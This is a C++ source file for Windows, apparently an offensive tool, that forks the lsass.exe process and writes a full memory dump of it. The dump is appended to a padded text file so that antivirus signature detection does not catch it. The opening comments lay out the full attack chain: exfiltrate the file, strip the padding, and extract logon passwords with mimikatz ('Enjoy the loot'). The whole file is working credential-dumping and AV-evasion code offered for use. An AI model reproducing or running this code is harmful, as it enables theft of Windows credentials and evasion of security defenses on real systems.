//This code will append the dump into an already existing file - this'll kill the signature detection that AV is looking for in a .dmp file. (When the .dmp file is written to disk it'll get detected as an lsass dump)
//To do this just create a file in the same directory called "forkanddump.txt" and add 10,000+ lines of anything in there. 
//The LSASS dump will be appended at like 10,000 (or whatever length you made it).
//Following this process exfiltrate this .txt file and delete the first 10,000 (or your length) lines and then rename it to lsass.dmp and hand it to mimikatz:
// sekurlsa::minidump <path to your .dmp file>
// sekurlsa::logonpasswords
//Enjoy the loot


#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <winternl.h>
#include <tchar.h>

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "ntdll.lib")

using namespace std;

typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL);

int main() {
    DWORD sasPID = 0;
    HANDLE sasHandle = NULL;
    HANDLE forkedProcess = NULL;
    HANDLE outFile = CreateFile(L"forkanddump.txt", FILE_APPEND_DATA | FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (outFile == INVALID_HANDLE_VALUE) {
        cout << "[-] Failed to open or create file in append mode." << endl;
        return 1;
    }

    // Move the file pointer to the end of the file
    SetFilePointer(outFile, 0, NULL, FILE_END);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
                sasPID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    if (sasPID == 0) {
        cout << "[-] Could not find sas.exe process." << endl;
        return 1;
    }

    wcout << "[+] Got sas.exe PID: " << sasPID << endl;

    // Open handle to sas.exe process
    sasHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, sasPID);
    if (sasHandle == NULL) {
        cout << "[-] Failed to open sas.exe process." << endl;
        return 1;
    }

    // Get the address of NtCreateProcessEx
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        cout << "[-] Failed to get handle to ntdll.dll." << endl;
        return 1;
    }

    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    if (!NtCreateProcessEx) {
        cout << "[-] Failed to get address of NtCreateProcessEx." << endl;
        return 1;
    }

    // Create a forked process
    NTSTATUS status = NtCreateProcessEx(&forkedProcess, PROCESS_ALL_ACCESS, NULL, sasHandle, 0, NULL, NULL, NULL);
    if (status != 0) {
        cout << "[-] Failed to create forked process." << endl;
        return 1;
    }

    cout << "[+] Forked process created successfully." << endl;

    // Get the PID of the forked process
    DWORD forkedProcessPID = GetProcessId(forkedProcess);

    wcout << "[+] Got forkedProcessPID: " << forkedProcessPID << endl;

    // Dump the forked process
    BOOL isDumped = MiniDumpWriteDump(forkedProcess, forkedProcessPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (isDumped) {
        cout << "[+] sas forked process dumped successfully!" << endl;
    }
    else {
        cout << "[-] Failed to dump sas forked process." << endl;
    }

    CloseHandle(outFile);
    CloseHandle(sasHandle);
    CloseHandle(forkedProcess);

    char input;
    std::cout << "Break" << std::endl;
    std::cin >> input;

    return 0;
}
